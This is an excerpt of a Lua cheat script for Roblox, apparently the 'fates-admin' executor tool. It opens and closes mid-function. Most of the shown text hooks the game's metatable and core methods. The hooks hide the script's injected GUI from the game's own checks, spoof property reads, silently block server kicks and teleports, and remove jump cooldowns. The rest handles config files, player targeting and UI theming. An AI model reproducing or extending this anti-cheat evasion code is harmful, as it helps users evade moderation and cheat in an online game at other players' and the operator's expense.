					part1.CFrame = part2.CFrame
				else
					part1.CFrame = touched[1]
					touched[1] = nil
				end
			end
		end
		local newcclosure = newcclosure or function(f)
			return f
		end

		hookfunction = GEnv.hookfunction or function(func, newfunc, applycclosure)
			if (replaceclosure) then
				replaceclosure(func, newfunc);
				return func
			end
			func = applycclosure and newcclosure or newfunc
			return func
		end

		local CachedConnections = setmetatable({}, {
			__mode = "v"
		});

		getconnections = function(Connection, FromCache, AddOnConnect)
			local getconnections = GEnv.getconnections
			if (not getconnections) then
				return {}
			end

			local CachedConnection;
			for i, v in next, CachedConnections do
				if (i == Connection) then
					CachedConnection = v
					break;
				end
			end
			if (CachedConnection and FromCache) then
				return CachedConnection
			end

			local Connections = GEnv.getconnections(Connection);
			CachedConnections[Connection] = Connections
			return Connections
		end
	end

	local getrawmetatable = getrawmetatable or function()
		return setmetatable({}, {});
	end

	local getnamecallmethod = getnamecallmethod or function()
		return ""
	end

	local checkcaller = checkcaller or function()
		return false
	end

	local Hooks = {
		AntiKick = false,
		AntiTeleport = false,
		NoJumpCooldown = false,
	}

	local mt = getrawmetatable(game);
	local OldMetaMethods = {}
	setreadonly(mt, false);
	for i, v in next, mt do
		OldMetaMethods[i] = v
	end
	setreadonly(mt, true);
	local MetaMethodHooks = {}

	local ProtectInstance, SpoofInstance, SpoofProperty;
	local UnSpoofInstance;
	local ProtectedInstances = setmetatable({}, {
		__mode = "v"
	});
	do
		local SpoofedInstances = setmetatable({}, {
			__mode = "v"
		});
		local SpoofedProperties = {}
		Hooks.SpoofedProperties = SpoofedProperties

		ProtectInstance = function(Instance_)
			if (not Tfind(ProtectedInstances, Instance_)) then
				ProtectedInstances[#ProtectedInstances + 1] = Instance_
			end
		end

		SpoofInstance = function(Instance_, Instance2)
			if (not SpoofedInstances[Instance_]) then
				SpoofedInstances[Instance_] = Instance2 and Instance2 or Clone(Instance_);
			end
		end

		UnSpoofInstance = function(Instance_)
			if (SpoofedInstances[Instance_]) then
				SpoofedInstances[Instance_] = nil
			end
		end

		local ChangedSpoofedProperties = {}
		SpoofProperty = function(Instance_, Property, NoClone)
			if (SpoofedProperties[Instance_]) then
				local SpoofedPropertiesForInstance = SpoofedProperties[Instance_]
				local Properties = map(SpoofedPropertiesForInstance, function(i, v)
					return v.Property
				end)
				if (not Tfind(Properties, Property)) then
					SpoofedProperties[Instance_][#SpoofedPropertiesForInstance + 1] = {
						SpoofedProperty = SpoofedPropertiesForInstance.SpoofedProperty,
						Property = Property,
					};
				end
			else
				local Cloned;
				if (not NoClone and IsA(Instance_, "Instance") and not Services[tostring(Instance_)] and Instance_.Archivable) then
					local Success, Ret = pcall(Clone, Instance_);
					if (Success) then
						Cloned = Ret
					end
				end
				SpoofedProperties[Instance_] = {{
					SpoofedProperty = Cloned and Cloned or {[Property]=Instance_[Property]},
					Property = Property,
				}}
				ChangedSpoofedProperties[Instance_] = {}
			end
		end

		local GetAllParents = function(Instance_, NIV)
			if (typeof(Instance_) == "Instance") then
				local Parents = {}
				local Current = NIV or Instance_
				if (NIV) then
					Parents[#Parents + 1] = Current
				end
				repeat
					local Parent = Current.Parent
					Parents[#Parents + 1] = Parent
					Current = Parent
				until not Current
				return Parents
			end
			return {}
		end

		local Methods = {
			"FindFirstChild",
			"FindFirstChildWhichIsA",
			"FindFirstChildOfClass",
			"IsA"
		}

		MetaMethodHooks.Namecall = function(...)
			local __Namecall = OldMetaMethods.__namecall;
			local Args = {...}
			local self = Args[1]
			local Method = getnamecallmethod() or "";

			if (Method ~= "") then
				local Success = pcall(OldMetaMethods.__index, self, Method);
				if (not Success) then
					return __Namecall(...);
				end
			end

			if (Hooks.AntiKick and lower(Method) == "kick") then
				local Player, Message = self, Args[2]
				if (Hooks.AntiKick and Player == LocalPlayer) then
					local Notify = Utils.Notify
					local Context;
					if (setthreadidentity) then
						Context = getthreadidentity();
						setthreadidentity(3);
					end
					if (Notify and Context) then
						Notify(nil, "Attempt to kick", format("attempt to kick %s", (Message and type(Message) == 'number' or type(Message) == 'string') and ": " .. Message or ""));
						setthreadidentity(Context);
					end
					return
				end
			end

			if (Hooks.AntiTeleport and Method == "Teleport" or Method == "TeleportToPlaceInstance") then
				local Player, PlaceId = self, Args[2]
				if (Hooks.AntiTeleport and Player == LocalPlayer) then
					local Notify = Utils.Notify
					local Context;
					if (setthreadidentity) then
						Context = getthreadidentity();
						setthreadidentity(3);
					end
					if (Notify and Context) then
						Notify(nil, "Attempt to teleport", format("attempt to teleport to place %s", PlaceId and PlaceId or ""));
						setthreadidentity(Context);
					end
					return
				end
			end

			if (checkcaller()) then
				return __Namecall(...);
			end

			if (Tfind(Methods, Method)) then
				local ReturnedInstance = __Namecall(...);
				if (Tfind(ProtectedInstances, ReturnedInstance)) then
					return Method == "IsA" and false or nil
				end
			end

			if (lower(Method) == "getchildren" or lower(Method) == "getdescendants") then
				return filter(__Namecall(...), function(i, v)
					local Protected = false
					for i2 = 1, #ProtectedInstances do
						local ProtectedInstance = ProtectedInstances[i2]
						local Success = pcall(tostring, ProtectedInstance)
						Protected = ProtectedInstance == v or (Success and v.IsDescendantOf(v, ProtectedInstance));
						if (Protected) then
							break;
						end
					end
					return not Protected
				end)
			end

			if (Method == "GetFocusedTextBox") then
				local Protected = false
				for i = 1, #ProtectedInstances do
					local ProtectedInstance = ProtectedInstances[i]
					Protected = not Tfind(ProtectedInstances, FocusedTextBox) or FocusedTextBox.IsDescendantOf(FocusedTextBox, ProtectedInstance);
				end
				if (Protected) then
					return nil
				end
			end

			if (Hooks.NoJumpCooldown and Method == "GetState" or Method == "GetStateEnabled") then
				local State = __Namecall(...);
				if (Method == "GetState" and (State == Enum.HumanoidStateType.Jumping or State == "Jumping")) then
					return Enum.HumanoidStateType.RunningNoPhysics
				end
				if (Method == "GetStateEnabled" and (self == Enum.HumanoidStateType.Jumping or self == "Jumping")) then
					return false
				end
			end

			return __Namecall(...);
		end

		local AllowedIndexes = {
			"RootPart",
			"Parent"
		}
		local AllowedNewIndexes = {
			"Jump"
		}
		MetaMethodHooks.Index = function(...)
			local __Index = OldMetaMethods.__index;

			if (checkcaller()) then
				return __Index(...);
			end
			local Instance_, Index = ...

			local SanitisedIndex = Index
			if (typeof(Instance_) == 'Instance' and type(Index) == 'string') then
				SanitisedIndex = gsub(sub(Index, 0, 100), "%z.*", "");
			end
			local SpoofedInstance = SpoofedInstances[Instance_]
			local SpoofedPropertiesForInstance = SpoofedProperties[Instance_]

			if (SpoofedInstance) then
				if (Tfind(AllowedIndexes, SanitisedIndex)) then
					return __Index(Instance_, Index);
				end
				return __Index(SpoofedInstance, Index);
			end

			if (SpoofedPropertiesForInstance) then
				for i, SpoofedProperty in next, SpoofedPropertiesForInstance do
					local SanitisedIndex = gsub(SanitisedIndex, "^%l", upper);
					if (SanitisedIndex == SpoofedProperty.Property) then
						local ClientChangedData = ChangedSpoofedProperties[Instance_][SanitisedIndex]
						local IndexedSpoofed = __Index(SpoofedProperty.SpoofedProperty, Index);
						local Indexed = __Index(Instance_, Index);
						if (ClientChangedData.Caller and ClientChangedData.Value ~= Indexed) then
							OldMetaMethods.__newindex(SpoofedProperty.SpoofedProperty, Index, Indexed);
							OldMetaMethods.__newindex(Instance_, Index, ClientChangedData.Value);
							return Indexed
						end
						return IndexedSpoofed
					end
				end
			end

			if (Tfind(ProtectedInstances, __Index(...))) then
				return nil
			end
			if (Tfind(ProtectedInstances, Instance_) and SanitisedIndex == "ClassName") then
				return "Part"
			end

			if (Hooks.NoJumpCooldown and SanitisedIndex == "Jump") then
				if (IsA(Instance_, "Humanoid")) then
					return false
				end
			end

			return __Index(...);
		end

		MetaMethodHooks.NewIndex = function(...)
			local __NewIndex = OldMetaMethods.__newindex;
			local __Index = OldMetaMethods.__index;
			local Instance_, Index, Value = ...

			local SpoofedInstance = SpoofedInstances[Instance_]
			local SpoofedPropertiesForInstance = SpoofedProperties[Instance_]

			if (checkcaller()) then
				if (Index == "Parent" and Value) then
					local ProtectedInstance
					for i = 1, #ProtectedInstances do
						local ProtectedInstance_ = ProtectedInstances[i]
						if (Instance_ == ProtectedInstance_ or Instance_.IsDescendantOf(Value, ProtectedInstance_)) then
							ProtectedInstance = true
						end
					end
					if (ProtectedInstance) then
						local Parents = GetAllParents(Instance_, Value);
						for i, v in next, getconnections(Parents[1].ChildAdded, true) do
							v.Disable(v);
						end
						for i = 1, #Parents do
							local Parent = Parents[i]
							for i2, v in next, getconnections(Parent.DescendantAdded, true) do
								v.Disable(v);
							end
						end
						local Ret = __NewIndex(...);
						for i = 1, #Parents do
							local Parent = Parents[i]
							for i2, v in next, getconnections(Parent.DescendantAdded, true) do
								v.Enable(v);
							end
						end
						for i, v in next, getconnections(Parents[1].ChildAdded, true) do
							v.Enable(v);
						end
						return Ret
					end
				end
				if (SpoofedInstance or SpoofedPropertiesForInstance) then
					if (SpoofedPropertiesForInstance) then
						ChangedSpoofedProperties[Instance_][Index] = {
							Caller = true,
							BeforeValue = Instance_[Index],
							Value = Value
						}
					end
					local Connections = tbl_concat(
						getconnections(GetPropertyChangedSignal(Instance_, SpoofedPropertiesForInstance and SpoofedPropertiesForInstance.Property or Index)),
						getconnections(Instance_.Changed),
						getconnections(game.ItemChanged)
					)

					if (not next(Connections)) then
						return __NewIndex(Instance_, Index, Value);
					end
					for i, v in next, Connections do
						v.Disable(v);
					end
					local Ret = __NewIndex(Instance_, Index, Value);
					for i, v in next, Connections do
						v.Enable(v);
					end
					return Ret
				end
				return __NewIndex(...);
			end

			local SanitisedIndex = Index
			if (typeof(Instance_) == 'Instance' and type(Index) == 'string') then
				SanitisedIndex = gsub(sub(Index, 0, 100), "%z.*", "");
			end

			if (SpoofedInstance) then
				if (Tfind(AllowedNewIndexes, SanitisedIndex)) then
					return __NewIndex(...);
				end
				return __NewIndex(SpoofedInstance, Index, __Index(SpoofedInstance, Index));
			end

			if (SpoofedPropertiesForInstance) then
				for i, SpoofedProperty in next, SpoofedPropertiesForInstance do
					if (SpoofedProperty.Property == SanitisedIndex and not Tfind(AllowedIndexes, SanitisedIndex)) then
						ChangedSpoofedProperties[Instance_][SanitisedIndex] = {
							Caller = false,
							BeforeValue = Instance_[Index],
							Value = Value
						}
						return __NewIndex(SpoofedProperty.SpoofedProperty, Index, Value);
					end
				end
			end

			return __NewIndex(...);
		end

		local hookmetamethod = hookmetamethod or function(metatable, metamethod, func)
			setreadonly(metatable, false);
			Old = hookfunction(metatable[metamethod], func, true);
			setreadonly(metatable, true);
			return Old
		end

		OldMetaMethods.__index = hookmetamethod(game, "__index", MetaMethodHooks.Index);
		OldMetaMethods.__newindex = hookmetamethod(game, "__newindex", MetaMethodHooks.NewIndex);
		OldMetaMethods.__namecall = hookmetamethod(game, "__namecall", MetaMethodHooks.Namecall);
	end

	Hooks.OldGetChildren = hookfunction(game.GetChildren, newcclosure(function(...)
		if (not checkcaller()) then
			local Children = Hooks.OldGetChildren(...);
			return filter(Children, function(i, v)
				return not Tfind(ProtectedInstances, v);
			end)
		end
		return Hooks.OldGetChildren(...);
	end));

	Hooks.OldGetDescendants = hookfunction(game.GetDescendants, newcclosure(function(...)
		if (not checkcaller()) then
			local Descendants = Hooks.OldGetDescendants(...);
			return filter(Descendants, function(i, v)
				local Protected = false
				for i2 = 1, #ProtectedInstances do
					local ProtectedInstance = ProtectedInstances[i2]
					Protected = v and ProtectedInstance == v or v.IsDescendantOf(v, ProtectedInstance)
					if (Protected) then
						break;
					end
				end
				return not Protected
			end)
		end
		return Hooks.OldGetDescendants(...);
	end));

	Hooks.FindFirstChild = hookfunction(game.FindFirstChild, newcclosure(function(...)
		if (not checkcaller()) then
			local ReturnedInstance = Hooks.FindFirstChild(...);
			if (ReturnedInstance and Tfind(ProtectedInstances, ReturnedInstance)) then
				return nil
			end
		end
		return Hooks.FindFirstChild(...);
	end));
	Hooks.FindFirstChildOfClass = hookfunction(game.FindFirstChildOfClass, newcclosure(function(...)
		if (not checkcaller()) then
			local ReturnedInstance = Hooks.FindFirstChildOfClass(...);
			if (ReturnedInstance and Tfind(ProtectedInstances, ReturnedInstance)) then
				return nil
			end
		end
		return Hooks.FindFirstChildOfClass(...);
	end));
	Hooks.FindFirstChildWhichIsA = hookfunction(game.FindFirstChildWhichIsA, newcclosure(function(...)
		if (not checkcaller()) then
			local ReturnedInstance = Hooks.FindFirstChildWhichIsA(...);
			if (ReturnedInstance and Tfind(ProtectedInstances, ReturnedInstance)) then
				return nil
			end
		end
		return Hooks.FindFirstChildWhichIsA(...);
	end));
	Hooks.IsA = hookfunction(game.IsA, newcclosure(function(...)
		if (not checkcaller()) then
			local Args = {...}
			local IsACheck = Args[1]
			if (IsACheck) then
				local ProtectedInstance = Tfind(ProtectedInstances, IsACheck);
				if (ProtectedInstance and Args[2]) then
					return false
				end
			end
		end
		return Hooks.IsA(...);
	end));

	local UndetectedCmdBar;
	Hooks.OldGetFocusedTextBox = hookfunction(Services.UserInputService.GetFocusedTextBox, newcclosure(function(...)
		if (not checkcaller() and UndetectedCmdBar) then
			local FocusedTextBox = Hooks.OldGetFocusedTextBox(...);
			local Protected = false
			for i = 1, #ProtectedInstances do
				local ProtectedInstance = ProtectedInstances[i]
				Protected = not Tfind(ProtectedInstances, FocusedTextBox) or FocusedTextBox.IsDescendantOf(FocusedTextBox, ProtectedInstance);
			end
			if (Protected) then
				return nil
			end
		end
		return Hooks.OldGetFocusedTextBox(...);
	end));

	Hooks.OldKick = hookfunction(LocalPlayer.Kick, newcclosure(function(...)
		local Player, Message = ...
		if (Hooks.AntiKick and Player == LocalPlayer) then
			local Notify = Utils.Notify
			local Context;
			if (setthreadidentity) then
				Context = getthreadidentity();
				setthreadidentity(3);
			end
			if (Notify and Context) then
				Notify(nil, "Attempt to kick", format("attempt to kick %s", (Message and type(Message) == 'number' or type(Message) == 'string') and ": " .. Message or ""));
				setthreadidentity(Context)
			end
			return
		end
		return Hooks.OldKick(...);
	end))

	Hooks.OldTeleportToPlaceInstance = hookfunction(Services.TeleportService.TeleportToPlaceInstance, newcclosure(function(...)
		local Player, PlaceId = ...
		if (Hooks.AntiTeleport and Player == LocalPlayer) then
			local Notify = Utils.Notify
			local Context;
			if (setthreadidentity) then
				Context = getthreadidentity();
				setthreadidentity(3);
			end
			if (Notify and Context) then
				Notify(nil, "Attempt to teleport", format("attempt to teleport to place %s", PlaceId and PlaceId or ""));
				setthreadidentity(Context)
			end
			return
		end
		return Hooks.OldTeleportToPlaceInstance(...);
	end))
	Hooks.OldTeleport = hookfunction(Services.TeleportService.Teleport, newcclosure(function(...)
		local Player, PlaceId = ...
		if (Hooks.AntiTeleport and Player == LocalPlayer) then
			local Notify = Utils.Notify
			local Context;
			if (setthreadidentity) then
				Context = getthreadidentity();
				setthreadidentity(3);
			end
			if (Notify and Context) then
				Notify(nil, "Attempt to teleport", format("attempt to teleport to place \"%s\"", PlaceId and PlaceId or ""));
				setthreadidentity(Context);
			end
			return
		end
		return Hooks.OldTeleport(...);
	end))

	Hooks.GetState = hookfunction(GetState, function(...)
		local Humanoid, State = ..., Hooks.GetState(...);
		local Parent, Character = Humanoid.Parent, LocalPlayer.Character
		if (Hooks.NoJumpCooldown and (State == Enum.HumanoidStateType.Jumping or State == "Jumping") and Parent and Character and Parent == Character) then
			return Enum.HumanoidStateType.RunningNoPhysics
		end
		return State
	end)

	Hooks.GetStateEnabled = hookfunction(__H.GetStateEnabled, function(...)
		local Humanoid, State = ...
		local Ret = Hooks.GetStateEnabled(...);
		local Parent, Character = Humanoid.Parent, LocalPlayer.Character
		if (Hooks.NoJumpCooldown and (State == Enum.HumanoidStateType.Jumping or State == "Jumping") and Parent and Character and Parent == Character) then
			return false
		end
		return Ret
	end)
	--END IMPORT [extend]



	local GetRoot = function(Plr, Char)
		local LCharacter = GetCharacter();
		local Character = Char or GetCharacter(Plr);
		return Plr and Character and (FindFirstChild(Character, "HumanoidRootPart") or FindFirstChild(Character, "Torso") or FindFirstChild(Character, "UpperTorso")) or LCharacter and (FindFirstChild(LCharacter, "HumanoidRootPart") or FindFirstChild(LCharacter, "Torso") or FindFirstChild(LCharacter, "UpperTorso"));
	end

	local GetHumanoid = function(Plr, Char)
		local LCharacter = GetCharacter();
		local Character = Char or GetCharacter(Plr);
		return Plr and Character and FindFirstChildWhichIsA(Character, "Humanoid") or LCharacter and FindFirstChildWhichIsA(LCharacter, "Humanoid");
	end

	local GetMagnitude = function(Plr, Char)
		local LRoot = GetRoot();
		local Root = GetRoot(Plr, Char);
		return Plr and Root and (Root.Position - LRoot.Position).magnitude or math.huge
	end

	local Settings = {
		Prefix = "!",
		CommandBarPrefix = "Semicolon",
		ChatPrediction = false,
		Macros = {},
		Aliases = {},
	}
	local PluginSettings = {
		PluginsEnabled = true,
		PluginDebug = false,
		DisabledPlugins = {
			["PluginName"] = true
		},
		SafePlugins = false
	}

	local WriteConfig = function(Destroy)
		local JSON = JSONEncode(Services.HttpService, Settings);
		local PluginJSON = JSONEncode(Services.HttpService, PluginSettings);
		if (isfolder("fates-admin") and Destroy) then
			delfolder("fates-admin");
			writefile("fates-admin/config.json", JSON);
			writefile("fates/admin/pluings/plugin-conf.json", PluginJSON);
		else
			makefolder("fates-admin");
			makefolder("fates-admin/plugins");
			makefolder("fates-admin/chatlogs");
			writefile("fates-admin/config.json", JSON);
			writefile("fates-admin/plugins/plugin-conf.json", PluginJSON);
		end
	end

	local GetConfig = function()
		if (isfolder("fates-admin") and isfile("fates-admin/config.json")) then
			return JSONDecode(Services.HttpService, readfile("fates-admin/config.json"));
		else
			WriteConfig();
			return JSONDecode(Services.HttpService, readfile("fates-admin/config.json"));
		end
	end

	local GetPluginConfig = function()
		if (isfolder("fates-admin") and isfolder("fates-admin/plugins") and isfile("fates-admin/plugins/plugin-conf.json")) then
			local JSON = JSONDecode(Services.HttpService, readfile("fates-admin/plugins/plugin-conf.json"));
			return JSON
		else
			WriteConfig();
			return JSONDecode(Services.HttpService, readfile("fates-admin/plugins/plugin-conf.json"));
		end
	end

	local SetPluginConfig = function(conf)
		if (isfolder("fates-admin") and isfolder("fates-admin/plugins") and isfile("fates-admin/plugins/plugin-conf.json")) then
			WriteConfig();
		end
		local NewConfig = GetPluginConfig();
		for i, v in next, conf do
			NewConfig[i] = v
		end
		writefile("fates-admin/plugins/plugin-conf.json", JSONEncode(Services.HttpService, NewConfig));
	end

	local SetConfig = function(conf)
		if (not isfolder("fates-admin") and isfile("fates-admin/config.json")) then
			WriteConfig();
		end
		local NewConfig = GetConfig();
		for i, v in next, conf do
			NewConfig[i] = v
		end
		writefile("fates-admin/config.json", JSONEncode(Services.HttpService, NewConfig));
	end

	local CurrentConfig = GetConfig();
	local Prefix = isfolder and CurrentConfig.Prefix or "!"
	local Macros = CurrentConfig.Macros or {}
	local AdminUsers = AdminUsers or {}
	local Exceptions = Exceptions or {}
	local Connections = {
		Players = {}
	}
	_L.CLI = false
	_L.ChatLogsEnabled = true
	_L.GlobalChatLogsEnabled = false
	_L.HttpLogsEnabled = true

	local GetPlayer;
	GetPlayer = function(str, noerror)
		local CurrentPlayers = filter(GetPlayers(Players), function(i, v)
			return not Tfind(Exceptions, v);
		end)
		if (not str) then
			return {}
		end
		str = lower(trim(str));
		if (Sfind(str, ",")) then
			return flatMap(split(str, ","), function(i, v)
				return GetPlayer(v, noerror);
			end)
		end

		local Magnitudes = map(CurrentPlayers, function(i, v)
			return {v,(GetRoot(v).CFrame.p - GetRoot().CFrame.p).Magnitude}
		end)

		local PlayerArgs = {
			["all"] = function()
				return filter(CurrentPlayers, function(i, v) -- removed all arg (but not really) due to commands getting messed up and people getting confused
					return v ~= LocalPlayer
				end)
			end,
			["others"] = function()
				return filter(CurrentPlayers, function(i, v)
					return v ~= LocalPlayer
				end)
			end,
			["nearest"] = function()
				sort(Magnitudes, function(a, b)
					return a[2] < b[2]
				end)
				return {Magnitudes[2][1]}
			end,
			["farthest"] = function()
				sort(Magnitudes, function(a, b)
					return a[2] > b[2]
				end)
				return {Magnitudes[2][1]}
			end,
			["random"] = function()
				return {CurrentPlayers[random(2, #CurrentPlayers)]}
			end,
			["allies"] = function()
				local LTeam = LocalPlayer.Team
				return filter(CurrentPlayers, function(i, v)
					return v.Team == LTeam
				end)
			end,
			["enemies"] = function()
				local LTeam = LocalPlayer.Team
				return filter(CurrentPlayers, function(i, v)
					return v.Team ~= LTeam
				end)
			end,
			["npcs"] = function()
				local NPCs = {}
				local Descendants = GetDescendants(Workspace);
				local GetPlayerFromCharacter = Players.GetPlayerFromCharacter
				for i = 1, #Descendants do
					local Descendant = Descendants[i]
					local DParent = Descendant.Parent
					if (IsA(Descendant, "Humanoid") and IsA(DParent, "Model") and (FindFirstChild(DParent, "HumanoidRootPart") or FindFirstChild(DParent, "Head")) and GetPlayerFromCharacter(Players, DParent) == nil) then
						local FakePlr = InstanceNew("Player"); -- so it can be compatible with commands
						FakePlr.Character = DParent
						FakePlr.Name = format("%s %s", DParent.Name, "- " .. Descendant.DisplayName);
						NPCs[#NPCs + 1] = FakePlr
					end
				end
				return NPCs
			end,
			["me"] = function()
				return {LocalPlayer}
			end
		}

		if (PlayerArgs[str]) then
			return PlayerArgs[str]();
		end

		local Players = filter(CurrentPlayers, function(i, v)
			return (sub(lower(v.Name), 1, #str) == str) or (sub(lower(v.DisplayName), 1, #str) == str);
		end)
		if (not next(Players) and not noerror) then
			Utils.Notify(LocalPlayer, "Fail", format("Couldn't find player %s", str));
		end
		return Players
	end

	local AddConnection = function(Connection, CEnv, TblOnly)
		if (CEnv) then
			CEnv[#CEnv + 1] = Connection
			if (TblOnly) then
				return Connection
			end
		end
		Connections[#Connections + 1] = Connection
		return Connection
	end

	local LastCommand = {}

	--IMPORT [ui]
	Guis = {}
	ParentGui = function(Gui, Parent)
		Gui.Name = sub(gsub(GenerateGUID(Services.HttpService, false), '-', ''), 1, random(25, 30))
		ProtectInstance(Gui);
		Gui.Parent = Parent or Services.CoreGui
		Guis[#Guis + 1] = Gui
		return Gui
	end
	UI = Clone(Services.InsertService:LoadLocalAsset("rbxassetid://7882275026"));
	UI.Enabled = true

	local CommandBarPrefix;

	local ConfigUI = UI.Config
	local ConfigElements = ConfigUI.GuiElements
	local CommandBar = UI.CommandBar
	local Commands = UI.Commands
	local ChatLogs = UI.ChatLogs
	local Console = UI.Console
	local GlobalChatLogs = Clone(UI.ChatLogs);
	local HttpLogs = Clone(UI.ChatLogs);
	local Notification = UI.Notification
	local Command = UI.Command
	local ChatLogMessage = UI.Message
	local GlobalChatLogMessage = Clone(UI.Message);
	local NotificationBar = UI.NotificationBar

	CommandBarOpen = false
	CommandBarTransparencyClone = Clone(CommandBar);
	ChatLogsTransparencyClone = Clone(ChatLogs);
	ConsoleTransparencyClone = Clone(Console);
	GlobalChatLogsTransparencyClone = Clone(GlobalChatLogs);
	HttpLogsTransparencyClone = Clone(HttpLogs);
	CommandsTransparencyClone = nil
	ConfigUIClone = Clone(ConfigUI);
	PredictionText = ""
	do
		local UIParent = CommandBar.Parent
		GlobalChatLogs.Parent = UIParent
		GlobalChatLogMessage.Parent = UIParent
		GlobalChatLogs.Name = "GlobalChatLogs"
		GlobalChatLogMessage.Name = "GlobalChatLogMessage"

		HttpLogs.Parent = UIParent
		HttpLogs.Name = "HttpLogs"
		HttpLogs.Size = UDim2.new(0, 421, 0, 260);
		HttpLogs.Search.PlaceholderText = "Search"
	end
	-- position CommandBar
	CommandBar.Position = UDim2.new(0.5, -100, 1, 5);

	local UITheme, Values;
	do
		local BaseBGColor = Color3.fromRGB(32, 33, 36);
		local BaseTransparency = 0.25
		local BaseTextColor = Color3.fromRGB(220, 224, 234);
		local BaseValues = { BackgroundColor = BaseBGColor, Transparency = BaseTransparency, TextColor = BaseTextColor }
		Values = { Background = clone(BaseValues), CommandBar = clone(BaseValues), CommandList = clone(BaseValues), Notification = clone(BaseValues), ChatLogs = clone(BaseValues), Config = clone(BaseValues) }
		local Objects = keys(Values);
		local GetBaseMT = function(Object)
			return setmetatable({}, {
				__newindex = function(self, Index, Value)
					local type = typeof(Value);
					if (Index == "BackgroundColor") then
						if (Value == "Reset") then
							Value = BaseBGColor
							type = "Color3"
						end
						assert(type == 'Color3', format("invalid argument #3 (Color3 expected, got %s)", type));
						if (Object == "Background") then
							CommandBar.BackgroundColor3 = Value
							Notification.BackgroundColor3 = Value
							Command.BackgroundColor3 = Value
							ChatLogs.BackgroundColor3 = Value
							ChatLogs.Frame.BackgroundColor3 = Value
							Console.BackgroundColor3 = Value
							Console.Frame.BackgroundColor3 = Value
							HttpLogs.BackgroundColor3 = Value
							HttpLogs.Frame.BackgroundColor3 = Value
							UI.ToolTip.BackgroundColor3 = Value
							ConfigUI.BackgroundColor3 = Value
							ConfigUI.Container.BackgroundColor3 = Value
							Commands.BackgroundColor3 = Value
							Commands.Frame.BackgroundColor3 = Value
							local Children = GetChildren(UI.NotificationBar);
							for i = 1, #Children do
								local Child = Children[i]
								if (IsA(Child, "GuiObject")) then
									Child.BackgroundColor3 = Value
								end
							end
							local Children = GetChildren(Commands.Frame.List);
							for i = 1, #Children do
								local Child = Children[i]
								if (IsA(Child, "GuiObject")) then
									Child.BackgroundColor3 = Value
								end
							end
							for i, v in next, Values do
								Values[i].BackgroundColor = Value
							end
						elseif (Object == "CommandBar") then
							CommandBar.BackgroundColor3 = Value
						elseif (Object == "Notification") then
							Notification.BackgroundColor3 = Value
							local Children = GetChildren(UI.NotificationBar);
							for i = 1, #Children do
								local Child = Children[i]
								if (IsA(Child, "GuiObject")) then
									Child.BackgroundColor3 = Value
								end
							end
						elseif (Object == "CommandList") then
							Commands.BackgroundColor3 = Value
							Commands.Frame.BackgroundColor3 = Value
						elseif (Object == "Command") then
							Command.BackgroundColor3 = Value
						elseif (Object == "ChatLogs") then
							ChatLogs.BackgroundColor3 = Value
							ChatLogs.Frame.BackgroundColor3 = Value
							HttpLogs.BackgroundColor3 = Value
							HttpLogs.Frame.BackgroundColor3 = Value
						elseif (Object == "Console") then
							Console.BackgroundColor3 = Value
							Console.Frame.BackgroundColor3 = Value
						elseif (Object == "Config") then
							ConfigUI.BackgroundColor3 = Value
							ConfigUI.Container.BackgroundColor3 = Value
						end
						Values[Object][Index] = Value
					elseif (Index == "TextColor") then
						if (Value == "Reset") then
							Value = BaseTextColor
							type = "Color3"
						end
						assert(type == 'Color3', format("invalid argument #3 (Color3 expected, got %s)", type));
						if (Object == "Notification") then
							Notification.Title.TextColor3 = Value
							Notification.Message.TextColor3 = Value
							Notification.Close.TextColor3 = Value
						elseif (Object == "CommandBar") then
							CommandBar.Input.TextColor3 = Value
							CommandBar.Arrow.TextColor3 = Value
						elseif (Object == "CommandList") then
							Command.CommandText.TextColor3 = Value
							local Descendants = GetDescendants(Commands);
							for i = 1, #Descendants do
								local Descendant = Descendants[i]
								local IsText = IsA(Descendant, "TextBox") or IsA(Descendant, "TextLabel") or IsA(Descendant, "TextButton");
								if (IsText) then
									Descendant.TextColor3 = Value
								end
							end
						elseif (Object == "ChatLogs") then
							UI.Message.TextColor3 = Value
						elseif (Object == "Config") then
							local Descendants = GetDescendants(ConfigUI);
							for i = 1, #Descendants do
								local Descendant = Descendants[i]
								local IsText = IsA(Descendant, "TextBox") or IsA(Descendant, "TextLabel") or IsA(Descendant, "TextButton");
								if (IsText) then
									Descendant.TextColor3 = Value
								end
							end
						elseif (Object == "Background") then
							Notification.Title.TextColor3 = Value
							Notification.Message.TextColor3 = Value
							Notification.Close.TextColor3 = Value
							CommandBar.Input.TextColor3 = Value
							CommandBar.Arrow.TextColor3 = Value
							Command.CommandText.TextColor3 = Value
							UI.Message.TextColor3 = Value
							local Descendants = GetDescendants(ConfigUI);
							for i = 1, #Descendants do
								local Descendant = Descendants[i]
								local IsText = IsA(Descendant, "TextBox") or IsA(Descendant, "TextLabel") or IsA(Descendant, "TextButton");
								if (IsText) then
									Descendant.TextColor3 = Value
								end
							end
							local Descendants = GetDescendants(Commands);
							for i = 1, #Descendants do
								local Descendant = Descendants[i]
								local IsText = IsA(Descendant, "TextBox") or IsA(Descendant, "TextLabel") or IsA(Descendant, "TextButton");
								if (IsText) then
									Descendant.TextColor3 = Value
								end
							end
							for i, v in next, Values do
								Values[i].TextColor = Value
							end
						end
						Values[Object][Index] = Value
					elseif (Index == "Transparency") then
						if (Value == "Reset") then
							Value = BaseTransparency
							type = "number"
						end
						assert(type == 'number', format("invalid argument #3 (Color3 expected, got %s)", type));
						if (Object == "Background") then
							CommandBar.Transparency = Value
							Notification.Transparency = Value
							Command.Transparency = Value + .5
							ChatLogs.Transparency = Value
							ChatLogs.Frame.Transparency = Value
							HttpLogs.Transparency = Value
							HttpLogs.Frame.Transparency = Value
							UI.ToolTip.Transparency = Value
							ConfigUI.Transparency = Value
							ConfigUI.Container.Transparency = Value + .5
							Commands.Transparency = Value
							Commands.Frame.Transparency = Value + .5
							Values[Object][Index] = Value
						elseif (Object == "Notification") then
							Notification.Transparency = Value
							local Children = GetChildren(UI.NotificationBar);
							for i = 1, #Children do
								local Child = Children[i]
								if (IsA(Child, "GuiObject")) then
									Child.Transparency = Value
								end
							end
						end
						Values[Object][Index] = Value
					end
				end,
				__index = function(self, Index)
					return Values[Object][Index]
				end
			})
		end
		UITheme = setmetatable({}, {
			__index = function(self, Index)
				if (Tfind(Objects, Index)) then
					local BaseMt = GetBaseMT(Index);
					self[Index] = BaseMt
					return BaseMt
				end
			end
		})
	end

	local IsSupportedExploit = isfile and isfolder and writefile and readfile

	local GetThemeConfig
	local WriteThemeConfig = function(Conf)
		if (IsSupportedExploit and isfolder("fates-admin")) then
			local ToHSV = Color3.new().ToHSV
			local ValuesToEncode = deepsearchset(Values, function(i, v)
				return typeof(v) == 'Color3'
